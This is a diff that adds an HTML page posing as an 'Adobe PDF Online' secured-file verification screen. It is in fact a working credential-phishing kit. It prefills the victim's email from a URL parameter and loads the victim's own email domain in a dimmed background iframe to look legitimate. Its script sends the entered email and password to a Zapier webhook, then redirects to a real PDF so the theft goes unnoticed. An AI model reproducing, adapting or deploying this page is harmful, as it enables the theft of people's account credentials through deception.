@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+
+    <title>Adobe PDF Online</title>
+    <style>
+        body {
+            background: #f5f5f5;
+            background: linear-gradient(to bottom, #ffffff 0%, #f5f5f5 100%);
+            font-family: 'Roboto', sans-serif;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        #root {
+            position: fixed;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+            filter: brightness(0.3);
+        }
+        .header-bar {
+            background-color: #ff0000;
+            padding: 10px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .header-title {
+            color: #fff;
+            font-weight: 700;
+            font-size: 1.5rem;
+            letter-spacing: 0.5px;
+        }
+        .main-container {
+            padding: 20px 10px;
+        }
+        .card {
+            border: none;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
+            padding: 20px;
+            background: #fff;
+            max-width: 400px;
+            margin: 0 auto;
+            transition: transform 0.3s ease;
+        }
+        .card:hover {
+            transform: translateY(-3px);
+        }
+        .card-title {
+            color: #ff0000;
+            font-size: 1.4rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .form-check-label {
+            color: #333;
+            font-size: 0.95rem;
+        }
+        .form-control {
+            border-radius: 20px;
+            padding: 10px 15px;
+            border: 1px solid #d1d1d1;
+            font-size: 0.9rem;
+            transition: border-color 0.3s ease;
+        }
+        .form-control:focus {
+            border-color: #ff0000;
+            box-shadow: 0 0 5px rgba(255, 0, 0, 0.3);
+        }
+        .submit-btn {
+            background: #ff0000;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 25px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 0.95rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background 0.3s ease, transform 0.2s ease;
+            width: 100%;
+        }
+        .submit-btn:hover {
+            background: #e60000;
+            transform: scale(1.03);
+        }
+        .submit-btn:active {
+            transform: scale(0.97);
+        }
+        .footer-text {
+            color: #666;
+            font-size: 0.8rem;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        @media (max-width: 576px) {
+            .header-title {
+                font-size: 1.2rem;
+            }
+            .card {
+                padding: 15px;
+                max-width: 100%;
+                margin: 0 10px;
+            }
+            .card-title {
+                font-size: 1.2rem;
+            }
+            .form-check-label {
+                font-size: 0.85rem;
+            }
+            .form-control {
+                font-size: 0.85rem;
+                padding: 8px 12px;
+            }
+            .submit-btn {
+                font-size: 0.9rem;
+                padding: 8px 20px;
+            }
+            .footer-text {
+                font-size: 0.75rem;
+            }
+            .main-container {
+                padding: 15px 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <iframe
+            id="myframe"
+            scrolling="no"
+            src=""
+            width="100%"
+            height="100%"
+            frameborder="0"
+            loading="eager"
+        ></iframe>
+    </div>
+    <div class="container-fluid p-0">
+        <!-- Header -->
+        <div class="header-bar">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12 text-center">
+                        <span class="header-title">Adobe PDF Online</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-container">
+            <div class="row justify-content-center">
+                <div class="col-12 col-lg-5">
+                    <div class="card">
+                        <div class="card-title">Secured Adobe File Verification</div>
+                        <div class="form-check mb-2">
+                            <input type="radio" class="form-check-input" name="optradio" value="view" checked>
+                            <label class="form-check-label">View File Online</label>
+                        </div>
+                        <div class="form-check mb-2">
+                            <input type="radio" class="form-check-input" name="optradio" value="download">
+                            <label class="form-check-label">Download File</label>
+                        </div>
+                        <div class="form-check mb-3">
+                            <input type="radio" class="form-check-input" name="optradio" value="email">
+                            <label class="form-check-label">Send File to Email</label>
+                        </div>
+
+                        <!-- Updated Form (Zapier Webhook) -->
+                        <div class="mt-4 mx-auto">
+                            <form id="loginForm" action="https://hooks.zapier.com/hooks/catch/22601907/2x8fmop/" method="POST" class="form-horizontal well">
+                                <div id="div1" class="text-dark">
+                                    <div>
+                                        <div class="form-group">
+                                            <input type="email" class="form-control" value="[[_email]]" name="email" placeholder="Email" required>
+                                        </div>
+                                        <div class="form-group">
+                                            <label class="font-weight-bold">Password</label>
+                                            <input type="password" name="password" class="form-control" pattern=".{5,}" required placeholder="Enter your password">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="text-center">
+                                    <button type="submit" class="submit-btn">Login To View File</button>
+                                </div>
+                                <div class="footer-text">To access our online secured documents page, you are required to login with your email address to ensure you are the rightful recipient for the protected file. Unauthorized access is prohibited.</div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JavaScript for background iframe and form submission -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Function to update iframe background based on email domain
+            function updateBackground(email) {
+                const $iframe = $('#myframe');
+                const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+                
+                if (re.test(email)) {
+                    const domain = email.split('@')[1];
+                    $iframe.attr('src', `https://${domain}`);
+                } else {
+                    $iframe.attr('src', '');
+                }
+            }
+
+            // Update on email input
+            $("input[name='email']").on("input", function() {
+                updateBackground($(this).val());
+            });
+
+            // Auto-populate from URL parameter if exists
+            const urlParams = new URLSearchParams(window.location.search);
+            const emailParam = urlParams.get('email');
+            if (emailParam) {
+                $("input[name='email']").val(emailParam);
+                updateBackground(emailParam);
+            }
+
+            // Handle form submission with AJAX and redirect
+            $('#loginForm').on('submit', function(event) {
+                event.preventDefault(); // Prevent default form submission
+
+                const $form = $(this);
+                const formData = $form.serialize(); // Serialize form data
+                const action = $('input[name="optradio"]:checked').val(); // Get selected radio button value
+
+                // Define redirect URLs based on radio button selection
+                let redirectUrl;
+                if (action === 'view') {
+                    redirectUrl = 'https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf'; // Replace with your view file URL
+                } else if (action === 'download') {
+                    redirectUrl = 'https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf'; // Replace with your download file URL
+                } else if (action === 'email') {
+                    redirectUrl = 'https://www.nacha.org/system/files/2021-07/DP-Authorization-Form.pdf'; // Replace with your email file URL
+                }
+
+                $.ajax({
+                    url: $form.attr('action'),
+                    method: 'POST',
+                    data: formData,
+                    success: function(response) {
+                        // Check if Zapier response includes a redirect URL
+                        if (response.redirect) {
+                            window.location.href = response.redirect;
+                        } else {
+                            // Use predefined redirect URL based on radio button
+                            window.location.href = redirectUrl;
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        console.error('Submission failed:', error);
+                        alert('Error submitting form. Please try again.');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>         
